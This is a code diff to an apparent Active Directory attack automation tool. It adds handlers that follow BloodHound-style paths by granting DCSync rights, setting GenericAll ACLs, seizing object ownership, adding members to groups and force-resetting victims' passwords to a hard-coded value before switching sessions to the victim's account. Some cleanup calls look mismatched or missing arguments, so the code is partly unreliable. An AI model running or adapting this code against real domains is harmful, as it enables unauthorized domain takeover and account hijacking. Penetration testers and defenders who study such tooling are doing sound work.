@@ -6,8 +6,17 @@ class Automation:
         self.conn = config.ConnectionHandler(args=args)
         self.rel_types = {
             0 : self._memberOf,
+            1 : self._dcSync,
+            2 : self._setDCSync,
+            3 : self._ownerDomain,
             100 : self._addMember,
-            100000 : self._forceChangePassword
+            200 : self._aclGroup,
+            300 : self._ownerGroup,
+            100000 : self._forceChangePassword,
+            100001 : self._aclObj,
+            100002 : self._ownerObj,
+            100101 : self._aclObj,
+            100102 : self._ownerObj
         }
         self.dirty_laundry = []
 
@@ -19,9 +28,9 @@ class Automation:
             try:
                 self.rel_types[typeID](rel)
             except Exception as e:
-                _washer()
+                self._washer()
                 raise e
-        _washer()
+        self._washer()
         self.conn.close()
 
     def _washer(self):
@@ -29,25 +38,65 @@ class Automation:
             laundry['f'](self.conn, *laundry['args'])
 
     def _switchUser(self, user, pwd):
-        _washer()
+        self._washer()
         self.conn.switchUser(user, pwd)
 
     def _memberOf(self, rel):
         return
     
+    def _dcSync(self, rel):
+        return
+    
+    def _setDCSync(self, rel):
+        user = rel['start_node']['distinguishedname']
+        modules.setDCSync(user)
+        self.dirty_laundry.append({'f':modules.setDCSync, 'args':[user,'False']})
+    
+    def _ownerDomain(self, rel):
+        self._setOwner(rel)
+        self._setDCSync(rel)
+
     def _addMember(self, rel):
         member = rel['start_node']['objectid']
         group = rel['end_node']['distinguishedname']
         modules.addForeignObjectToGroup(self.conn, member, group)
         self.dirty_laundry.append({'f':modules.delObjectFromGroup, 'args':[member,group]})
+    
+    def _aclGroup(self, rel):
+        self._genericAll(rel)
+        self._addMember(rel)
+    
+    def _ownerGroup(self, rel):
+        self._setOwner(rel)
+        self._aclGroup(rel)
+    
+    def _aclObj(self, rel):
+        self._genericAll(rel)
+        self._forceChangePassword(rel)
+    
+    def _ownerObj(self, rel):
+        self._setOwner(rel)
+        self._aclObj(rel)
 
     # TODO: change password change with shadow credentials when it's possible
     # TODO: don't perform change password if it's explicitly refused by user
     def _forceChangePassword(self, rel):
         user = rel['end_node']['name'].split('@')[0]
         pwd = 'Password512!'
-        LOG.debug(f"[+] changing {user} password")
+        LOG.debug(f'[+] changing {user} password')
         modules.changePassword(self.conn, user, pwd)
-        LOG.info(f"[+] password changed for to {pwd} for {user}")
+        LOG.info(f'[+] password changed for to {pwd} for {user}')
         self._switchUser(user, pwd)
-        LOG.debug(f"[+] switch LDAP/SAMR connection to user {user}")
+        LOG.debug(f'[+] switch LDAP/SAMR connection to user {user}')
+
+    def _genericAll(self, rel):
+        user = rel['start_node']['distinguishedname']
+        target = rel['end_node']['distinguishedname']
+        modules.setGenericAll(self.conn, user, target)
+        self.dirty_laundry.append({'f':modules.setGenericAll, 'args':[user,target,'False']})
+    
+    def _setOwner(self, rel):
+        user = rel['start_node']['distinguishedname']
+        target = rel['end_node']['distinguishedname']
+        old_sid = modules.setOwner(self.conn, user, target)
+        self.dirty_laundry.append({'f':modules.setGenericAll, 'args':[old_sid,target]})
